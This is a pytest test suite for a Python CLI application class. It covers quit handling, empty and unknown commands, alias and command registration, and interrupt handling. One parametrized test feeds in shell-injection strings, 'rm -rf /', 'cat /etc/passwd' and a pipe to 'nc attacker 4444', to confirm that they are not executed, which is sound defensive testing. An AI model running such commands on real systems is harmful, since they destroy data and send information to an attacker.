"""
=============================================================================
 Licensed Materials, Property of neuraldevelopment, Munich
 Project : basefunctions
 Copyright (c) by neuraldevelopment
 All rights reserved.

 Description:
 Pytest test suite for CLIApplication.
 Tests CLI application orchestration with CRITICAL security focus.

 Log:
 v1.0.0 : Initial test implementation
=============================================================================
"""

# -------------------------------------------------------------
# IMPORTS
# -------------------------------------------------------------
# External imports
import pytest
from typing import List
from unittest.mock import Mock, patch, MagicMock

# Project imports
from basefunctions.cli import CLIApplication, BaseCommand, CommandMetadata

# -------------------------------------------------------------
# FIXTURES
# -------------------------------------------------------------


@pytest.fixture
def cli_app() -> CLIApplication:
    """Provide CLIApplication instance."""
    return CLIApplication("test_app", version="1.0", enable_completion=False)


# -------------------------------------------------------------
# TESTS: Command Execution - CRITICAL
# -------------------------------------------------------------


def test_execute_command_handles_quit(cli_app: CLIApplication) -> None:
    """Test _execute_command handles quit command."""
    # ACT
    cli_app._execute_command("quit")

    # ASSERT
    assert cli_app.running is False


def test_execute_command_handles_empty_input(cli_app: CLIApplication) -> None:  # CRITICAL TEST
    """Test _execute_command handles empty input gracefully."""
    # ACT & ASSERT - Should not raise
    cli_app._execute_command("")
    cli_app._execute_command("   ")


@pytest.mark.parametrize("malicious_input", [
    "command; rm -rf /",
    "command && cat /etc/passwd",
    "command | nc attacker 4444",
])
def test_execute_command_does_not_execute_shell_commands(  # CRITICAL TEST
    cli_app: CLIApplication,
    malicious_input: str,
    capsys
) -> None:
    """Test _execute_command does not execute shell metacharacters."""
    # ACT
    cli_app._execute_command(malicious_input)

    # ASSERT
    captured = capsys.readouterr()
    assert "Error: Unknown command" in captured.out or "Error:" in captured.out


def test_execute_command_handles_unknown_command(cli_app: CLIApplication, capsys) -> None:
    """Test _execute_command shows error for unknown command."""
    # ACT
    cli_app._execute_command("nonexistent_command")

    # ASSERT
    captured = capsys.readouterr()
    assert "Error: Unknown command" in captured.out


def test_register_command_group_adds_to_registry(cli_app: CLIApplication, concrete_base_command: BaseCommand) -> None:
    """Test register_command_group adds handler."""
    # ACT
    cli_app.register_command_group("test", concrete_base_command)

    # ASSERT
    handlers = cli_app.registry.get_handlers("test")
    assert len(handlers) == 1


def test_register_alias_adds_to_registry(cli_app: CLIApplication) -> None:
    """Test register_alias adds alias."""
    # ACT
    cli_app.register_alias("ll", "list")

    # ASSERT
    aliases = cli_app.registry.get_all_aliases()
    assert "ll" in aliases


def test_run_handles_keyboard_interrupt_gracefully(cli_app: CLIApplication) -> None:
    """Test run handles KeyboardInterrupt."""
    # ARRANGE
    with patch('builtins.input', side_effect=KeyboardInterrupt()):
        # ACT & ASSERT - Should not raise
        cli_app.run()


def test_run_handles_eof_gracefully(cli_app: CLIApplication) -> None:
    """Test run handles EOFError."""
    # ARRANGE
    with patch('builtins.input', side_effect=EOFError()):
        # ACT & ASSERT - Should not raise
        cli_app.run()
